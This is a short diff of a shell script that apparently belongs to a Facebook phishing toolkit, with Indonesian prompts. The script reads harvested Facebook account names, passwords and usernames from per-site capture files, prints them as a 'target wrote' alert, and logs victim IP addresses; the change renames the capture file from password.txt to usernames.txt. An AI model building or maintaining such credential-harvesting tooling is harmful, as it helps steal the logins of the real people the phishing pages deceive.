@@ -9,10 +9,10 @@ cat site/$server/ip.txt >> saved.ip.txt
 }
 
 password(){
-facebook=$(grep -o 'akun:*' site/$server/password.txt | cut -d ":" -f2 )
-password=$(grep -o 'password:*' site/$server/password.txt | cut -d ":" -f2 )
+facebook=$(grep -o 'akun:*' site/$server/usernames.txt | cut -d ":" -f2 )
+password=$(grep -o 'password:*' site/$server/usernames.txt | cut -d ":" -f2 )
 IFS=$'\n'
-username=$(grep -o 'Account:*' site/server/password.txt | cut -d ":" -f2 )
+username=$(grep -o 'Account:*' site/server/usernames.txt | cut -d ":" -f2 )
 printf '\n'
 printf "\033[34;1m[\033[31;1m+\033[34;1m]\033[33;1mAkun Fb:" $facebook
 printf '\n'
@@ -37,7 +37,7 @@ fi
 
 sleep 0.5
 
-if [[ -e "site/$server/password.txt" ]]; then
+if [[ -e "site/$server/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Target menulis!\n"
 password
 
